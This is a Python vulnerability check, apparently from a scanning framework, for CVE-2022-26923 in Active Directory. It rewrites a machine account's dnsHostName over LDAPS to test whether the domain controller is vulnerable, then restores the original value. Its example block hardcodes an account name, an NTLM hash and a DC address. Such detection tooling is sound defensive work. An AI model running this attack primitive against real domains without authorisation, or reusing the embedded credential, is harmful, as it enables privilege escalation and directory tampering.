import logging

import ldap3
from copy import deepcopy
from certipy.lib.ldap import LDAPConnection
from certipy.lib.target import Target

from lib.runner import Runner


class CVE202226923(Runner):
    def __init__(self, target: Target, scheme='ldaps', **kwargs):
        """
            cve-2022-26923漏洞检测
            必要条件：
                1. 一个域内存在的机器用户（非禁用状态）
                2. 机器用户的密码或者hash
                3. 域控ip
            """
        super().__init__(target=target,
                         required_params=['username', ('password', 'hashes'), 'dc_ip'])
        self._scheme = scheme
        self._connection = None
        self._target = target
        self._opts = kwargs

    def run(self, target_ip=None):
        """
            检测原理：利用一个【机器账户】的身份去域控上将自己的dnsHostName属性修改为与原来不同的值，
            如果能够修改成功，表示存在CVE-2022-26923
            如果返回错误码19，表示该服务器已打补丁
            如果返回错误码49，表示密码错误
            具体错误码参考 https://ldap.com/ldap-result-code-reference/
            """
        if target_ip is not None:
            target_ip = target_ip
        else:
            target_ip = self._target.dc_ip
        _target = deepcopy(self._target)
        _target.dc_ip = target_ip
        _target.target_ip = target_ip
        _connection = LDAPConnection(_target, self._scheme)
        _connection.connect()
        machine_user = _connection.get_user(self._target.username)
        logging.debug(f'got user {machine_user}')
        dns_hostname = machine_user['attributes']['dnsHostname']
        new_dns_hostname = '.'.join(['amulab-netstar'] + dns_hostname.split('.')[1:])
        logging.debug(f'setting a new dnsHostname : {new_dns_hostname}')
        result = _connection.modify(machine_user.get('distinguishedName'), {
            'dnsHostname': (ldap3.MODIFY_REPLACE, new_dns_hostname)
        })
        if result["result"] == 0:
            logging.info(f'[{target_ip}] success, target is vulnerable!!!')
        elif result["result"] == 19:
            logging.info(f'[{target_ip}] constraintViolation, target is not vulnerable :<')
        else:
            logging.error(f'unknown error happened {result["result"]}'
                          f'check here https://ldap.com/ldap-result-code-reference/')
        logging.debug(f'restoring old dnsHostname')
        result = _connection.modify(machine_user.get('distinguishedName'), {
            'dnsHostname': (ldap3.MODIFY_REPLACE, dns_hostname)
        })
        if result["result"] == 0:
            logging.debug(f'old dnsHostname restored.')
        else:
            logging.error(f'unknown error happened {result["result"]}')


if __name__ == '__main__':
    logging.getLogger().setLevel(logging.DEBUG)
    target = Target.create(
        username='JDCA$',
        hashes='48f925772624af82147e750a45b912a8',
        dc_ip='192.168.31.110'
    )
    runner = CVE202226923(target)
    runner.run()